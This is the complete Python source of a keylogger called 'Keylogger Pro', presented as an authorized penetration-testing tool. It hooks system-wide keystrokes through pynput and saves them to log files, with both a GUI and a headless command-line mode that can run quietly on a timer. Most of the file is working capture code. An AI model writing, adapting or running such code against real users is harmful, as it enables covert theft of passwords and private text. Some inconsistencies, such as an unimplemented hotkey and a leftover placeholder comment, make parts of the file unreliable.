#!/usr/bin/env python3
"""
Keylogger Pro v2.0 - Authorized Penetration Testing Tool
For authorized security assessments only. Requires explicit permission.
"""

import sys
import os
import threading
import json
from datetime import datetime
from pathlib import Path

# Import tkinter constants FIRST for fallback
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog

# Try ttkbootstrap
try:
    import ttkbootstrap as tb
    from ttkbootstrap.constants import *
    USING_TTKBOOTSTRAP = True
except ImportError:
    # Define constants from tkinter for fallback
    BOTH = tk.BOTH
    END = tk.END
    WORD = tk.WORD
    HORIZONTAL = tk.HORIZONTAL
    VERTICAL = tk.VERTICAL
    DISABLED = tk.DISABLED
    NORMAL = tk.NORMAL
    LEFT = tk.LEFT
    RIGHT = tk.RIGHT
    X = tk.X
    Y = tk.Y
    TOP = tk.TOP
    BOTTOM = tk.BOTTOM
    NONE = tk.NONE
    SUNKEN = tk.SUNKEN
    RAISED = tk.RAISED
    tb = None
    USING_TTKBOOTSTRAP = False
    print("[*] ttkbootstrap not installed. Install with: pip install ttkbootstrap")

# ... rest of the code stays the same ...

from pynput import keyboard

# ============================================================
# CONFIGURATION
# ============================================================
CONFIG_FILE = Path("keylogger_config.json")
DEFAULT_LOG_DIR = Path("keylogs")
DEFAULT_LOG_FILE = "session_log.txt"

# ============================================================
# KEYLOGGER ENGINE
# ============================================================
class KeyloggerEngine:
    """Core keylogging engine using pynput"""

    def __init__(self):
        self.listener = None
        self.running = False
        self.keys_buffer = []
        self.current_line = ""
        self.log_data = []
        self.on_key_callback = None
        self.log_file = None
        self.log_path = None
        self.session_start = None
        self.session_count = 0

    def start(self, log_path=None):
        """Start capturing keystrokes"""
        if self.running:
            return False

        self.session_start = datetime.now()
        self.session_count += 1

        if log_path:
            self.log_path = Path(log_path)
        else:
            timestamp = self.session_start.strftime("%Y%m%d_%H%M%S")
            DEFAULT_LOG_DIR.mkdir(exist_ok=True)
            self.log_path = DEFAULT_LOG_DIR / f"session_{timestamp}.txt"

        self.keys_buffer = []
        self.current_line = ""
        self.log_data = []
        self.running = True

        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start()

        # Write session header
        self._write_log(f"\n{'='*60}\n")
        self._write_log(f"SESSION STARTED: {self.session_start.strftime('%Y-%m-%d %H:%M:%S')}\n")
        self._write_log(f"{'='*60}\n\n")

        if self.on_key_callback:
            self.on_key_callback("started", f"Session {self.session_count} started")

        return True

    def stop(self):
        """Stop capturing keystrokes"""
        if not self.running:
            return

        self.running = False
        if self.listener:
            self.listener.stop()
            self.listener = None

        # Flush remaining buffer
        if self.current_line:
            self.log_data.append(self.current_line)
            self._write_log(self.current_line + "\n")

        end_time = datetime.now()
        duration = end_time - self.session_start if self.session_start else "Unknown"

        self._write_log(f"\n{'='*60}\n")
        self._write_log(f"SESSION ENDED: {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        self._write_log(f"DURATION: {duration}\n")
        self._write_log(f"{'='*60}\n\n")

        if self.on_key_callback:
            self.on_key_callback("stopped", f"Session {self.session_count} stopped. Duration: {duration}")

    def toggle(self):
        """Toggle keylogger on/off"""
        if self.running:
            self.stop()
        else:
            self.start()
        return self.running

    def _on_press(self, key):
        """Handle key press events"""
        if not self.running:
            return

        try:
            if hasattr(key, 'char') and key.char is not None:
                # Regular character
                self.current_line += key.char
                char_display = key.char
            elif key == keyboard.Key.space:
                self.current_line += " "
                char_display = "[SPACE]"
            elif key == keyboard.Key.enter:
                self.log_data.append(self.current_line)
                self._write_log(self.current_line + "\n")
                char_display = f"[ENTER]\n{self.current_line}"
                self.current_line = ""
            elif key == keyboard.Key.tab:
                self.current_line += "\t"
                char_display = "[TAB]"
            elif key == keyboard.Key.backspace:
                if self.current_line:
                    self.current_line = self.current_line[:-1]
                char_display = "[BACKSPACE]"
            elif key == keyboard.Key.esc:
                char_display = "[ESC]"
                self._write_log("[ESC]\n")
            elif key == keyboard.Key.shift:
                char_display = "[SHIFT]"
            elif key == keyboard.Key.shift_r:
                char_display = "[SHIFT_R]"
            elif key == keyboard.Key.ctrl_l:
                char_display = "[CTRL]"
            elif key == keyboard.Key.ctrl_r:
                char_display = "[CTRL_R]"
            elif key == keyboard.Key.alt_l:
                char_display = "[ALT]"
            elif key == keyboard.Key.alt_r:
                char_display = "[ALT_R]"
            elif key == keyboard.Key.caps_lock:
                char_display = "[CAPS_LOCK]"
            elif key == keyboard.Key.delete:
                char_display = "[DEL]"
            elif key == keyboard.Key.home:
                char_display = "[HOME]"
            elif key == keyboard.Key.end:
                char_display = "[END]"
            elif key == keyboard.Key.page_up:
                char_display = "[PGUP]"
            elif key == keyboard.Key.page_down:
                char_display = "[PGDN]"
            elif key == keyboard.Key.up:
                char_display = "[UP]"
            elif key == keyboard.Key.down:
                char_display = "[DOWN]"
            elif key == keyboard.Key.left:
                char_display = "[LEFT]"
            elif key == keyboard.Key.right:
                char_display = "[RIGHT]"
            elif key == keyboard.Key.f1:
                char_display = "[F1]"
            elif key == keyboard.Key.f2:
                char_display = "[F2]"
            elif key == keyboard.Key.f3:
                char_display = "[F3]"
            elif key == keyboard.Key.f4:
                char_display = "[F4]"
            elif key == keyboard.Key.f5:
                char_display = "[F5]"
            elif key == keyboard.Key.f6:
                char_display = "[F6]"
            elif key == keyboard.Key.f7:
                char_display = "[F7]"
            elif key == keyboard.Key.f8:
                char_display = "[F8]"
            elif key == keyboard.Key.f9:
                char_display = "[F9]"
            elif key == keyboard.Key.f10:
                char_display = "[F10]"
            elif key == keyboard.Key.f11:
                char_display = "[F11]"
            elif key == keyboard.Key.f12:
                char_display = "[F12]"
            else:
                char_display = f"[{str(key)}]"
        except Exception as e:
            char_display = f"[ERROR:{e}]"

        if self.on_key_callback:
            self.on_key_callback("key", char_display)

    def _on_release(self, key):
        """Handle key release — currently just a pass-through"""
        pass

    def _write_log(self, text):
        """Write text to log file"""
        try:
            with open(self.log_path, 'a', encoding='utf-8') as f:
                f.write(text)
        except Exception as e:
            if self.on_key_callback:
                self.on_key_callback("error", f"Write error: {e}")

    def get_log_text(self):
        """Get full log as string"""
        if self.log_path and self.log_path.exists():
            try:
                return self.log_path.read_text(encoding='utf-8')
            except:
                return "Error reading log file."
        return "No log file found."

    def get_stats(self):
        """Get session statistics"""
        stats = {
            "running": self.running,
            "session": self.session_count,
            "keys_captured": sum(len(l) for l in self.log_data) + len(self.current_line),
            "lines": len(self.log_data) + (1 if self.current_line else 0),
            "current_line": self.current_line,
            "log_path": str(self.log_path) if self.log_path else "N/A",
        }
        if self.session_start and self.running:
            duration = datetime.now() - self.session_start
            stats["duration"] = str(duration).split('.')[0]
        elif hasattr(self, '_last_duration'):
            stats["duration"] = self._last_duration
        else:
            stats["duration"] = "00:00:00"

        return stats


# ============================================================
# GUI APPLICATION
# ============================================================
class KeyloggerApp:
    """Main GUI Application"""

    def __init__(self):
        self.engine = KeyloggerEngine()
        self.engine.on_key_callback = self._engine_callback

        # Setup UI
        if USING_TTKBOOTSTRAP:
            self.root = tb.Window(themename="darkly")
            self.root.title("🔐 Keylogger Pro - Authorized Pentesting Tool")
        else:
            self.root = tk.Tk()
            self.root.title("Keylogger Pro - Authorized Pentesting Tool")
            self.root.configure(bg='#2d2d2d')

        self.root.geometry("900x650")
        self.root.minsize(800, 550)

        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

        self._build_ui()
        self._load_config()

        # Live update timer
        self._update_ui()

    def _build_ui(self):
        """Build the user interface"""
        if USING_TTKBOOTSTRAP:
            self._build_ttkbootstrap_ui()
        else:
            self._build_fallback_ui()

    def _build_ttkbootstrap_ui(self):
        """Modern UI with ttkbootstrap"""
        # Main container
        main = tb.Frame(self.root)
        main.pack(fill=BOTH, expand=True, padx=10, pady=10)

        # ── Header ──
        header = tb.Label(
            main,
            text="🔐 Keylogger Pro — Authorized Pentesting Tool",
            font=("Helvetica", 16, "bold"),
            bootstyle="inverse-primary"
        )
        header.pack(fill=X, pady=(0, 10), ipady=8)

        # Status bar
        self.status_bar = tb.Label(
            main,
            text="● STOPPED",
            font=("Consolas", 10),
            bootstyle="secondary"
        )
        self.status_bar.pack(fill=X, pady=(0, 5))

        # ── Control Panel ──
        control_frame = tb.LabelFrame(main, text="Controls", bootstyle="primary", padding=10)
        control_frame.pack(fill=X, pady=(0, 10))

        controls_row = tb.Frame(control_frame)
        controls_row.pack(fill=X)

        self.btn_start = tb.Button(
            controls_row,
            text="▶ Start Capture",
            command=self._toggle_keylogger,
            bootstyle="success-outline",
            width=18
        )
        self.btn_start.pack(side=LEFT, padx=(0, 5))

        self.btn_stop = tb.Button(
            controls_row,
            text="⏹ Stop Capture",
            command=self._stop_keylogger,
            bootstyle="danger-outline",
            width=18,
            state=DISABLED
        )
        self.btn_stop.pack(side=LEFT, padx=5)

        self.btn_save_as = tb.Button(
            controls_row,
            text="💾 Save Log As...",
            command=self._save_log_as,
            bootstyle="info-outline",
            width=18
        )
        self.btn_save_as.pack(side=LEFT, padx=5)

        self.btn_clear = tb.Button(
            controls_row,
            text="🗑 Clear Stats",
            command=self._clear_stats,
            bootstyle="warning-outline",
            width=18
        )
        self.btn_clear.pack(side=LEFT, padx=5)

        self.btn_open_log = tb.Button(
            controls_row,
            text="📂 Open Log File",
            command=self._open_log_file,
            bootstyle="secondary-outline",
            width=18
        )
        self.btn_open_log.pack(side=LEFT, padx=5)

        # ── Stats and Log Panel (side by side) ──
        content_pane = tb.PanedWindow(main, orient=HORIZONTAL, bootstyle="primary")
        content_pane.pack(fill=BOTH, expand=True)

        # Left: Stats
        stats_frame = tb.LabelFrame(content_pane, text="Session Statistics", bootstyle="info", padding=10)
        content_pane.add(stats_frame, weight=1)

        self.stats_text = tb.Text(
            stats_frame,
            font=("Consolas", 10),
            height=12,
            wrap=WORD,
            state=DISABLED,
            bootstyle="dark"
        )
        self.stats_text.pack(fill=BOTH, expand=True)

        # Right: Live Log
        log_frame = tb.LabelFrame(content_pane, text="Live Keystroke Log", bootstyle="success", padding=10)
        content_pane.add(log_frame, weight=3)

        self.log_text = tb.Text(
            log_frame,
            font=("Consolas", 10),
            wrap=WORD,
            state=DISABLED,
            bootstyle="dark"
        )
        self.log_text.pack(fill=BOTH, expand=True)

        # Scrollbar for log
        log_scroll = tb.Scrollbar(self.log_text, orient=VERTICAL, bootstyle="primary-round")
        self.log_text.configure(yscrollcommand=log_scroll.set)
        log_scroll.pack(side=RIGHT, fill=Y)

        # ── Footer ──
        footer = tb.Label(
            main,
            text="Authorized for penetration testing only. All keystrokes are logged locally.",
            font=("Helvetica", 8),
            bootstyle="secondary"
        )
        footer.pack(fill=X, pady=(5, 0))

        # Hotkey hint
        hint = tb.Label(
            main,
            text="Press Ctrl+Alt+K to toggle capture | Ctrl+Alt+O to open log",
            font=("Consolas", 8),
            bootstyle="secondary"
        )
        hint.pack(fill=X)

    def _build_fallback_ui(self):
        """Fallback UI when ttkbootstrap is not available"""
        style = ttk.Style()
        try:
            style.theme_use("clam")
        except:
            pass

        # Configure dark-ish theme
        bg_color = '#2d2d2d'
        fg_color = '#ffffff'
        self.root.configure(bg=bg_color)

        main = ttk.Frame(self.root, padding=10)
        main.pack(fill=BOTH, expand=True)

        # Header
        header = ttk.Label(
            main,
            text="Keylogger Pro - Authorized Pentesting Tool",
            font=("Helvetica", 14, "bold")
        )
        header.pack(fill=X, pady=(0, 10))

        # Status
        self.status_bar = ttk.Label(main, text="● STOPPED", font=("Consolas", 10))
        self.status_bar.pack(fill=X, pady=(0, 5))

        # Controls
        control_frame = ttk.LabelFrame(main, text="Controls", padding=10)
        control_frame.pack(fill=X, pady=(0, 10))

        controls_row = ttk.Frame(control_frame)
        controls_row.pack(fill=X)

        self.btn_start = ttk.Button(
            controls_row,
            text="▶ Start Capture",
            command=self._toggle_keylogger,
            width=18
        )
        self.btn_start.pack(side=LEFT, padx=(0, 5))

        self.btn_stop = ttk.Button(
            controls_row,
            text="⏹ Stop Capture",
            command=self._stop_keylogger,
            width=18,
            state=DISABLED
        )
        self.btn_stop.pack(side=LEFT, padx=5)

        self.btn_save_as = ttk.Button(
            controls_row,
            text="💾 Save Log As...",
            command=self._save_log_as,
            width=18
        )
        self.btn_save_as.pack(side=LEFT, padx=5)

        self.btn_clear = ttk.Button(
            controls_row,
            text="🗑 Clear Stats",
            command=self._clear_stats,
            width=18
        )
        self.btn_clear.pack(side=LEFT, padx=5)

        self.btn_open_log = ttk.Button(
            controls_row,
            text="📂 Open Log File",
            command=self._open_log_file,
            width=18
        )
        self.btn_open_log.pack(side=LEFT, padx=5)

        # Main content area
        content_pane = ttk.PanedWindow(main, orient=HORIZONTAL)
        content_pane.pack(fill=BOTH, expand=True)

        # Stats
        stats_frame = ttk.LabelFrame(content_pane, text="Session Statistics", padding=10)
        content_pane.add(stats_frame, weight=1)

        self.stats_text = tk.Text(
            stats_frame,
            font=("Consolas", 10),
            height=12,
            wrap=WORD,
            state=DISABLED,
            bg='#1e1e1e',
            fg='#ffffff',
            insertbackground='#ffffff'
        )
        self.stats_text.pack(fill=BOTH, expand=True)

        # Log
        log_frame = ttk.LabelFrame(content_pane, text="Live Keystroke Log", padding=10)
        content_pane.add(log_frame, weight=3)

        self.log_text = tk.Text(
            log_frame,
            font=("Consolas", 10),
            wrap=WORD,
            state=DISABLED,
            bg='#1e1e1e',
            fg='#ffffff',
            insertbackground='#ffffff'
        )
        self.log_text.pack(fill=BOTH, expand=True)

        log_scroll = ttk.Scrollbar(self.log_text, orient=VERTICAL)
        self.log_text.configure(yscrollcommand=log_scroll.set)
        log_scroll.pack(side=RIGHT, fill=Y)

        # Footer
        footer = ttk.Label(
            main,
            text="Authorized for penetration testing only.",
            font=("Helvetica", 8)
        )
        footer.pack(fill=X, pady=(5, 0))

    # ── Callbacks ──

    def _engine_callback(self, event_type, data):
        """Handle events from the keylogger engine (runs in listener thread)"""
        if event_type == "key":
            self.root.after(0, self._append_log, data)
        elif event_type in ("started", "stopped"):
            self.root.after(0, self._update_status)
            self.root.after(0, self._append_log, f"\n>>> {data}\n")
        elif event_type == "error":
            self.root.after(0, self._append_log, f"\n!!! ERROR: {data}\n")

    def _append_log(self, text):
        """Append text to the log display"""
        self.log_text.configure(state=NORMAL)
        self.log_text.insert(END, text)
        self.log_text.see(END)
        self.log_text.configure(state=DISABLED)

    def _toggle_keylogger(self):
        """Toggle the keylogger on/off"""
        running = self.engine.toggle()
        self._update_buttons(running)
        self._update_status()

    def _stop_keylogger(self):
        """Stop the keylogger"""
        self.engine.stop()
        self._update_buttons(False)
        self._update_status()

    def _update_buttons(self, running):
        """Update button states based on running status"""
        if USING_TTKBOOTSTRAP:
            if running:
                self.btn_start.configure(state=DISABLED)
                self.btn_stop.configure(state=NORMAL)
            else:
                self.btn_start.configure(state=NORMAL)
                self.btn_stop.configure(state=DISABLED)
        else:
            self.btn_start.configure(state='disabled' if running else 'normal')
            self.btn_stop.configure(state='normal' if running else 'disabled')

    def _update_status(self):
        """Update the status bar"""
        stats = self.engine.get_stats()
        if stats["running"]:
            self.status_bar.configure(
                text=f"● RUNNING | Session: {stats['session']} | Duration: {stats['duration']} | Keys: {stats['keys_captured']} | Log: {stats['log_path']}",
            )
            if USING_TTKBOOTSTRAP:
                self.status_bar.configure(bootstyle="success")
        else:
            self.status_bar.configure(text="● STOPPED")
            if USING_TTKBOOTSTRAP:
                self.status_bar.configure(bootstyle="secondary")

    def _save_log_as(self):
        """Save the current log to a user-chosen location"""
        file_path = filedialog.asksaveasfilename(
            title="Save Log File",
            defaultextension=".txt",
            filetypes=[
                ("Text files", "*.txt"),
                ("Log files", "*.log"),
                ("All files", "*.*")
            ]
        )
        if file_path:
            log_text = self.engine.get_log_text()
            try:
                Path(file_path).write_text(log_text, encoding='utf-8')
                messagebox.showinfo("Saved", f"Log saved to:\n{file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Could not save file:\n{e}")

    def _open_log_file(self):
        """Open the current log file in the default system editor"""
        if self.engine.log_path and self.engine.log_path.exists():
            import subprocess
            import platform
            try:
                if platform.system() == "Windows":
                    os.startfile(self.engine.log_path)
                elif platform.system() == "Darwin":
                    subprocess.run(["open", str(self.engine.log_path)])
                else:
                    subprocess.run(["xdg-open", str(self.engine.log_path)])
            except Exception as e:
                messagebox.showerror("Error", f"Could not open file:\n{e}")
        else:
            messagebox.showinfo("No Log", "No active log file. Start a capture session first.")

    def _clear_stats(self):
        """Reset the display and statistics"""
        self.stats_text.configure(state=NORMAL)
        self.stats_text.delete(1.0, END)
        self.stats_text.configure(state=DISABLED)
        self.log_text.configure(state=NORMAL)
        self.log_text.delete(1.0, END)
        self.log_text.configure(state=DISABLED)

    def _update_ui(self):
        """Periodic UI update for live stats"""
        if hasattr(self, 'stats_text'):
            stats = self.engine.get_stats()
            running_indicator = "🟢 RUNNING" if stats['running'] else "🔴 STOPPED"
            info = (
                f"Session Status:     {running_indicator}\n"
                f"Session Number:     {stats['session']}\n"
                f"Duration:           {stats['duration']}\n"
                f"Keys Captured:      {stats['keys_captured']}\n"
                f"Lines Recorded:     {stats['lines']}\n"
                f"Current Buffer:     {repr(stats['current_line'][:80])}{'...' if len(stats['current_line']) > 80 else ''}\n"
                f"Log File:           {stats['log_path']}\n"
            )

            self.stats_text.configure(state=NORMAL)
            self.stats_text.delete(1.0, END)
            self.stats_text.insert(1.0, info)
            self.stats_text.configure(state=DISABLED)

        self._update_status()

        # Schedule next update
        self.root.after(1000, self._update_ui)

    def _load_config(self):
        """Load saved configuration if available"""
        try:
            if CONFIG_FILE.exists():
                config = json.loads(CONFIG_FILE.read_text())
                # Apply config settings here if needed
        except:
            pass

    def _save_config(self):
        """Save current configuration"""
        try:
            config = {}
            CONFIG_FILE.write_text(json.dumps(config, indent=2))
        except:
            pass

    def _on_close(self):
        """Handle window close event"""
        if self.engine.running:
            result = messagebox.askyesno(
                "Keylogger Running",
                "Keylogger is still capturing keystrokes.\nStop and exit?"
            )
            if not result:
                return
            self.engine.stop()
        self._save_config()
        self.root.destroy()

    def run(self):
        """Start the GUI main loop"""
        self.root.mainloop()


# ============================================================
# COMMAND-LINE INTERFACE
# ============================================================
def cli_mode():
    """Run keylogger in CLI (headless) mode"""
    import argparse
    parser = argparse.ArgumentParser(
        description="Keylogger Pro - Authorized Penetration Testing Tool",
        epilog="For authorized security assessments only."
    )
    parser.add_argument(
        "-o", "--output",
        help="Output log file path",
        default=None
    )
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        help="Auto-stop after N seconds",
        default=None
    )
    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Suppress live keystroke output"
    )
    args = parser.parse_args()

    engine = KeyloggerEngine()

    def on_key(event, data):
        if not args.quiet:
            if event == "key":
                print(data, end="", flush=True)
            elif event == "started":
                print(f"\n[INFO] {data}")
            elif event == "stopped":
                print(f"\n[INFO] {data}")

    engine.on_key_callback = on_key

    print("[*] Keylogger Pro - CLI Mode")
    print("[*] Authorized for pentesting only")
    print("[*] Press Ctrl+C to stop\n")

    engine.start(args.output)

    try:
        import signal
        def handler(sig, frame):
            raise KeyboardInterrupt()
        signal.signal(signal.SIGINT, handler)

        if args.timeout:
            import time
            time.sleep(args.timeout)
            raise KeyboardInterrupt()
        else:
            while engine.running:
                import time
                time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        engine.stop()
        print(f"\n[*] Log saved to: {engine.log_path}")
        print(f"[*] Total keys captured: {sum(len(l) for l in engine.log_data)}")


# ============================================================
# MAIN ENTRY POINT
# ============================================================
if __name__ == "__main__":
    # Check for command-line mode
    if len(sys.argv) > 1:
        cli_mode()
    else:
        app = KeyloggerApp()
        app.run()